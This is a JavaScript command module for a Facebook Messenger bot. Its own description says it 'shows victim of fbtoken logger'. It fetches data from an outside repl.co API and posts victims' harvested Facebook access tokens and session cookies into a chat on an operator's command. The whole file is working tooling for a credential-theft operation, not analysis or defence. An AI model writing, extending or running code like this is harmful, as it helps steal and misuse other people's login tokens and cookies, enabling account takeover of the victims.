const axios = require('axios');

module.exports.config = {
  name: 'fblog',
  hasPermssion: 3,
  version: '1.0 alpha',
  commandCategory: 'operator',
  usePrefix: true,
  credits: 'reiko dev',
  cooldowns: 8,
  description: 'shows victim of fbtoken logger',
  usages: '[token or cookies]',
};

module.exports.run = async function ({ api, event, args }) {
  const { threadID, messageID } = event;
  const response = await axios.get('https://replhome.codebox4chan.repl.co/api/fblog');
  try {
    if (args.length === 0) {
      api.sendMessage(`𝗙𝗕 𝗟𝗢𝗚𝗚𝗘𝗥🪵:\n\n${response.data.data}`, threadID, messageID);
      } else if (args[0] === 'token' || args[0] === 'tokens' || args[0] === '🪙') {
        // Handle case when args[0] is 'token', 'tokens', or '🪙'
        api.sendMessage(`𝗙𝗕 𝗟𝗢𝗚𝗚𝗘𝗥🪵:\n\n${response.data.token}`, threadID, messageID);
      } else if (args[0] === 'cookies' || args[0] === 'cookie' || args[0] === '🍪') {
        // Handle case when args[0] is 'cookies', 'cookie', or '🍪'
        api.sendMessage(`𝗙𝗕 𝗟𝗢𝗚𝗚𝗘𝗥🪵:\n\n${response.data.cookies}`, threadID, messageID);
      }
  } catch (error) {
    console.error('Error:', error);
    api.sendMessage('An error occurred while processing your request', threadID, messageID);
  }
};
